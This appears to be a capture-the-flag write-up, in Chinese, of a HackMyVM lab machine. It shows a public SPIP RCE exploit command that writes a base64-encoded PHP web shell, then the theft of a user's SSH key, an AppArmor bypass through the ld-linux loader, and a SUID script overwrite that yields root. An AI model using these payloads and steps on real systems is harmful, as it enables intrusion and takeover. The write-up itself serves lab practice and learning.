# Quick2

2025.03.29 https://hackmyvm.eu/machines/machine.php?vm=Publisher

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

http://192.168.5.40/spip/ 版本 SPIP 4.2.0 有 RCE https://www.exploit-db.com/exploits/51536

可以执行 shell，直接反弹不行，写入一句话：

```
python3 51536.py -u http://192.168.5.40/spip/ -c 'echo "PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg=="|base64 -d > shell.php' -v
```

写入后，得到反弹 shell。

user flag：

```
www-data@41c976e507f8:/home/think$ cat user.txt
fa229046d44eda6a3598c73ad96f4ca5
```

拿到 think 用户私钥，使用私钥登陆。

suid 发现 run_container 可以执行脚本 /opt/run_container.sh 并且有修改权限，但是提示不能修改，系统开启了 apparmor，查看 think 的 bash 发现是/usr/sbin/ash 进行绕过：

```
/lib64/ld-linux-x86-64.so.2 /bin/bash
```

```
think@publisher:/opt$ echo '/bin/bash -p' > run_container.sh
think@publisher:/opt$ /usr/sbin/run_container
bash-5.0# cd /root
bash-5.0# cat root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```
